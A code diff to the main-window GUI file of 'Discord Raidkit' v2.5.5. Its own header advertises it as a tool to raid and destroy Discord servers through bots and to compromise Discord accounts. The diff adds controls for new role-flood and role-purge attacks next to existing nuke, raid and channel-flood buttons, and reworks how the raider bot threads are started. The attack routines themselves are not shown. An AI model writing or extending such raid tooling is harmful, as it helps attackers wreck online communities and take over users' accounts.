@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.5.4 by the-cult-of-integral
+Discord Raidkit v2.5.5 by the-cult-of-integral
 
 An open-source, forever free tool that allows you to raid and destroy 
 Discord servers via Discord bots,  compromise Discord accounts, and 
@@ -61,13 +61,7 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
         self.config = config
         self.load_config_into_ui()
 
-        self.horus_thread = HorusThread(self.config, None)
-        self.horus_thread.signal_update_status.connect(self.update_status)
-        self.horus_thread.signal_append_hterminal.connect(self.append_hterminal)
-        self.horus_thread.signal_refresh_running_commands_view.connect(self.refresh_running_commands_view)
-        self.horus_thread.signal_bot_is_online.connect(self.bot_is_online)
-        self.horus_thread.signal_attempting_run.connect(self.bot_attempting_run)
-        self.horus_thread.signal_bot_has_been_run.connect(self.bot_has_been_run)
+        self.horus_thread = None
 
         self.osiris_thread = OsirisThread(self.config)
         self.osiris_thread.signal_append_oterminal.connect(self.append_oterminal)
@@ -126,6 +120,8 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
         self.btnInvokeNewWebhook.setEnabled(False)
         self.btnInvokeCPurge.setEnabled(False)
         self.btnInvokeCFlood.setEnabled(False)
+        self.btnInvokeRoleFlood.setEnabled(False)
+        self.btnInvokeRolePurge.setEnabled(False)
         self.btnInvokeAdmin.setEnabled(False)
         self.btnInvokeRaid.setEnabled(False)
         self.btnInvokeNuke.setEnabled(False)
@@ -486,6 +482,8 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
         self.btnInvokeNewWebhook.setEnabled(is_online)
         self.btnInvokeCPurge.setEnabled(is_online)
         self.btnInvokeCFlood.setEnabled(is_online)
+        self.btnInvokeRoleFlood.setEnabled(is_online)
+        self.btnInvokeRolePurge.setEnabled(is_online)
         self.btnInvokeAdmin.setEnabled(is_online)
         self.btnInvokeRaid.setEnabled(is_online)
         self.btnInvokeNuke.setEnabled(is_online)
@@ -510,16 +508,24 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
     # Horus Control Methods.
 
     def start_horus(self):
+        match self.config.horus.raider_type:
+            case EH_Raiders.ANUBIS.value:
+                self.horus_thread = HorusThread(self.config, Anubis())
+            case EH_Raiders.QETESH.value:
+                self.horus_thread = HorusThread(self.config, Qetesh())
+            case _:
+                self.update_status('Invalid raider type in configuration.')
+                return
+
+        self.horus_thread.signal_update_status.connect(self.update_status)
+        self.horus_thread.signal_append_hterminal.connect(self.append_hterminal)
+        self.horus_thread.signal_refresh_running_commands_view.connect(self.refresh_running_commands_view)
+        self.horus_thread.signal_bot_is_online.connect(self.bot_is_online)
+        self.horus_thread.signal_attempting_run.connect(self.bot_attempting_run)
+        self.horus_thread.signal_bot_has_been_run.connect(self.bot_has_been_run)
+
         if not self.horus_thread.isRunning():
             self.update_status('Attempting to start Horus...')
-            match self.config.horus.raider_type:
-                case EH_Raiders.ANUBIS.value:
-                    self.horus_thread.raider_type = Anubis()
-                case EH_Raiders.QETESH.value:
-                    self.horus_thread.raider_type = Qetesh()
-                case _:
-                    self.update_status('Invalid raider type in configuration.')
-                    return
             self.horus_thread.start()
 
     def stop_horus(self):
